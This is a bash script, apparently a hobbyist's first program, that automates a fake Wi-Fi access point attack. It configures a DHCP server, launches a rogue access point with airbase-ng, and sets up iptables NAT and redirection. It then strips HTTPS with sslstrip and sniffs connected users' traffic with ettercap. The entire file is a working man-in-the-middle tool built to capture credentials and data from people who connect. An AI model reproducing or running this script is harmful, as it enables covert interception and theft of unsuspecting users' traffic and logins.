#!/bin/bash
# Made by rabb1t 
# First Programm I wrote :D ... nothing special ... everyone can write this. FUNN
# bash is cool 

NC='\033[0m' 		  # No Color
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

printf "${Cyan}----------------------------FAKE AP GENERATOR------------------------------------"

printf "${BRed}INSTALLING...${Purple}"

apt-get install isc-dhcp-common
apt-get install isc-dhcp-server

echo "=============================INSTALLED========================"
echo 
route -n
echo 
echo "=============================================================="

printf "${BRed}MUST BE CONNECTED WITH eth0!!${NC}"

printf "${Green}Access Point Name : "
read wifiname

printf "Your Gateway : "
read gw
printf ${Blue}

echo 

echo "authoritative;" > /etc/dhcpd.conf
echo "default-lease-time 600;" >> /etc/dhcpd.conf
echo "max-lease-time 7200;" >> /etc/dhcpd.conf
echo "subnet 192.168.1.0 netmask 255.255.255.0 {" >> /etc/dhcpd.conf
echo "option routers 192.168.1.1;" >> /etc/dhcpd.conf
echo "option subnet-mask 255.255.255.0;" >> /etc/dhcpd.conf
echo 'option domain-name "'"$wifiname"'";' >> /etc/dhcpd.conf
echo "option domain-name-servers 192.168.1.1;" >> /etc/dhcpd.conf
echo "range 192.168.1.2 192.168.1.40;" >> /etc/dhcpd.conf
echo "}" >> /etc/dhcpd.conf
echo ""

printf "${BGreen}[+] starting"
echo 
echo "#!/bin/bash" > airbase.sh
echo airmon-ng check kill >> airbase.sh
echo airmon-ng start wlan0 >> airbase.sh
echo airbase-ng -c 11 -e $wifiname wlan0mon >> airbase.sh
chmod +x airbase.sh
gnome-terminal -x sh -c "./airbase.sh; bash"
sleep 3

#=========================CONFIGURATE============================

echo "#!/bin/bash" > setup.sh
echo "ifconfig at0 192.168.1.1 netmask 255.255.255.0" >> setup.sh
echo "ifconfig at0 mtu 1400" >> setup.sh
echo "route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1" >> setup.sh
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "iptables -t nat -A PREROUTING -p udp -j DNAT --to $gw" >> setup.sh
echo "iptables -P FORWARD ACCEPT" >> setup.sh
echo "iptables --append FORWARD --in-interface at0 -j ACCEPT" >> setup.sh
echo "iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE" >> setup.sh
echo "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000" >> setup.sh

chmod +x setup.sh
./setup.sh

#===========================SERVER SETUP============================

touch /var/lib/dhcp/dhcpd.leases
dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
/etc/init.d/isc-dhcp-server start

#========================START SSLSTRIP===============================

echo "#!/bin/bash" > sslstrip.sh
echo "sslstrip -f -p -k 10000" >> sslstrip.sh
chmod +x sslstrip.sh
gnome-terminal -x sh -c "./sslstrip.sh; bash"

#========================START SNIFF===================================

echo "#!/bin/bash" > etter.sh
echo "ettercap -p -u -T -q -i at0" >> etter.sh
chmod +x etter.sh
printf ${Red}
./etter.sh

#======================================================================
